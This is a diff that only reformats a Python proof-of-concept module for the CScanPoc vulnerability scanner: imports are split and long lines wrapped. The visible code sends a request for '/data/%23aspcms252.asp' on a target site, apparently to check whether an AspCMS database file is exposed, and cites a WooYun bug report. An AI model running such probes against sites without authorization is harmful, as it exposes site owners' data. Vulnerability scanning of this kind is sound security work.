@@ -3,7 +3,9 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
-import urllib.request, urllib.error, urllib.parse
+import urllib.request
+import urllib.error
+import urllib.parse
 import http.cookiejar
 
 
@@ -53,9 +55,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -63,7 +66,8 @@ class Poc(ABPoc):
             # http://www.wooyun.org/bugs/wooyun-2010-060483
             cookie = http.cookiejar.CookieJar()
             cookie_handler = NoExceptionCookieProcesser(cookie)
-            opener = urllib.request.build_opener(cookie_handler, urllib.request.HTTPHandler)
+            opener = urllib.request.build_opener(
+                cookie_handler, urllib.request.HTTPHandler)
             opener.open(self.target + '/data/%23aspcms252.asp')
             urllib.request.install_opener(opener)
             content = urllib.request.urlopen(self.target).read()
